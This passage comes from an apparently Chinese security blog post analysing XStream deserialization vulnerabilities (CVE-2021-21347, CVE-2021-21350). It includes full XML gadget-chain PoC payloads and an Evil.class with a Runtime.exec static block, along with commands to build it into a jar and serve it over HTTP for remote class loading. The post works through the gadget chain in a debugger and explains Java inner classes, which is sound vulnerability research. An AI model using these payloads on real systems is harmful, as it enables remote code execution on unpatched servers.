class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">'java.io.ByteArrayInputStream'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>-2147483648<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">'../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><p>我们在本地编写Evil.class打包成同名jar包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打包+打开Web服务8000端口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac Evil<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">jar</span> <span class="title">cvf</span> <span class="title">Evil</span>.<span class="title">jar</span> <span class="title">Evil</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class"><span class="title">python</span> -<span class="title">m</span> <span class="title">SimpleHTTPServer</span> 8000</span></span><br></pre></td></tr></table></figure><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809161155903.png" alt="image-20210809161155903" style="zoom:50%;"><p>调试：</p><p>threedr3am说他在8u131版本可以复现，实际上144应该也可以</p><p>首先PoC里面有一点比较特殊，用到了<code>ObservableList$1</code>这个匿名内部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ObservableList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">List</span>&lt;<span class="title">E</span>&gt;, <span class="title">Observable</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates a &#123;<span class="doctag">@link</span> SortedList&#125; wrapper of this list with the natural</span></span><br><span class="line"><span class="comment">     * ordering.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> new &#123;<span class="doctag">@code</span> SortedList&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> JavaFX 8.0</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">default</span> SortedList&lt;E&gt; <span class="title">sorted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Comparator naturalOrder = <span class="keyword">new</span> Comparator&lt;E&gt;() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(E o1, E o2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (o1 == <span class="keyword">null</span> &amp;&amp; o2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (o1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (o2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (o1 <span class="keyword">instanceof</span> Comparable) &#123;</span><br><span class="line">                    <span class="keyword">return</span> ((Comparable) o1).compareTo(o2);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> Collator.getInstance().compare(o1.toString(), o2.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> sorted(naturalOrder);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实<code>new Comparator&lt;E&gt;</code>就是一个匿名内部类</p><p>接下来和404SecTeam遇到了一样的坑点，在：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">'java.net.URLClassLoader'</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在<code>&lt;outer-class&gt;</code>标签处会报错，报错的原因是反序列化的时候找不到这个outer-class属性。</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210807192019965.png" alt="image-20210807192019965" style="zoom:50%;"><p>来到对应的类也就是<code>ProtectionDomain$Key</code>这个类中查看一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Used for storing ProtectionDomains as keys in a Map.</span><br><span class="line"> */</span><br><span class="line">static final class Key &#123;&#125;</span><br></pre></td></tr></table></figure><p>本地复现一下404的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String foocontent;</span><br><span class="line">    <span class="keyword">private</span> Bar bar;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFoocontent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> foocontent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFoocontent</span><span class="params">(String foocontent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.foocontent = foocontent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Bar <span class="title">getBar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBar</span><span class="params">(Bar bar)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.bar = bar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Bar</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String blabla;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getBlabla</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> blabla;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBlabla</span><span class="params">(String blabla)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.blabla = blabla;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Foo foo = <span class="keyword">new</span> Foo();</span><br><span class="line">        Bar bar = foo.<span class="keyword">new</span> Bar();</span><br><span class="line">        bar.setBlabla(<span class="string">"hello"</span>);</span><br><span class="line">        foo.setBar(bar);</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream();</span><br><span class="line">        String xml = xstream.toXML(foo);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210807192931008.png" alt="image-20210807192931008" style="zoom:50%;"><p>Foo类中有一个内部类Bar，并且Foo类中有一个Bar类型的属性</p><p>如果我们在实例化的过程中给bar属性赋值，<code>foo.setBar(foo.new Bar())</code>，引用自身成员内部类，这种情况XStream会使用<code>&lt;outer-class&gt;</code>标识来标注。</p><p>PoC这里表示的意思是Key作为一个成员内部类被ProtectionDomain引用，但是在jdk1.8.131中ProtectionDomain$Key是一个静态内部类呀，静态内部类XStream序列化的时候是不会通过&lt;outer-class&gt;标签进行标识的</p><h3 id="静态成员类"><a href="#静态成员类" class="headerlink" title="静态成员类"></a>静态成员类</h3><p>在Java语言中，类内部可以生明另一个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OuterClass</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticInnerClass</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">NoStaticInnerClass</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内部类可以分为：</p><ul><li>静态内部类 ： </li><li><strong>非静态内部类</strong>：内部包含一个<code>this$0</code> 变量指向外部类</li></ul><p>所以当然可以利用反射来操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OuterClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Field[] declaredFields = NoStaticInnerClass<span class="class">.<span class="keyword">class</span>.<span class="title">getDeclaredFields</span>()</span>;</span><br><span class="line">        Stream.of(declaredFields).forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有this$0</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoStaticInnerClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticInnerClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// final com.sec.exploits.XStream.OuterClass com.sec.exploits.XStream.OuterClass$NoStaticInnerClass.this$0</span></span><br></pre></td></tr></table></figure><p>在非静态内部类中，我们可以任意使用OuterClass.this来获取外部类实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OuterClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        NoStaticInnerClass noStaticInnerClass = <span class="keyword">new</span> OuterClass().<span class="keyword">new</span> NoStaticInnerClass();</span><br><span class="line">        System.out.println(noStaticInnerClass.getOuterClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有this$0</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoStaticInnerClass</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> OuterClass <span class="title">getOuterClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> OuterClass.<span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticInnerClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在8u231环境下做实验：</p><p>回到之前的说的，用到了<code>ObservableList$1</code>这个匿名内部类，实际上就是<code>Collator.getInstance()</code></p><p>接下来调用了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">default</span> SortedList&lt;E&gt; <span class="title">sorted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Comparator naturalOrder = <span class="keyword">new</span> Comparator&lt;E&gt;() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(E o1, E o2)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (o1 == <span class="keyword">null</span> &amp;&amp; o2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (o1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (o2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (o1 <span class="keyword">instanceof</span> Comparable) &#123;</span><br><span class="line">                <span class="keyword">return</span> ((Comparable) o1).compareTo(o2);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> Collator.getInstance().compare(o1.toString(), o2.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> sorted(naturalOrder);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 o1和o2是同一个Base64Data对象，目的调用Base64Data.toString方法，toString方法中调用了Base64Data.get方法,在get方法中调用了ByteArrayOutputStreamEx.readFrom()方法，传入的参数is是一个SequenceInputStream对象</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809150227085.png" alt="image-20210809150227085" style="zoom:50%;"><p>此时Base64Data对象：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809150142184.png" alt="image-20210809150142184" style="zoom:50%;"><p>接下来经过一系列调用，会来到<code>nextStream()</code>方法中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">nextStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in != <span class="keyword">null</span>) &#123;</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (e.hasMoreElements()) &#123;</span><br><span class="line">        in = (InputStream) e.nextElement();</span><br><span class="line">        <span class="keyword">if</span> (in == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> in = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会考虑e属性的值，在判断的时候其实会来到<code>hasNext()</code>方法，这里会根据<code>processorCL</code>的内容进行对象的实例化</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809151301208.png" alt="image-20210809151301208"></p><p>这里对应PoC中的写法就是：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809151626276.png" alt="image-20210809151626276" style="zoom:50%;"><h1 id="CVE-2021-21350"><a href="#CVE-2021-21350" class="headerlink" title="CVE_2021_21350"></a>CVE_2021_21350</h1><p>XStream：1.4.15</p><p>jdk: 8u231</p><h2 id="漏洞成因-7"><a href="#漏洞成因-7" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>和CVE-2021-21347类似，这是把远程jar改为了BCEL方式加载</p><h2 id="PoC-7"><a href="#PoC-7" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">'javafx.collections.ObservableList$1'</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">'java.io.SequenceInputStream'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">'javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">'com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">'java.util.AbstractList$Itr'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">'java.util.Arrays$ArrayList'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">'string-array'</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span 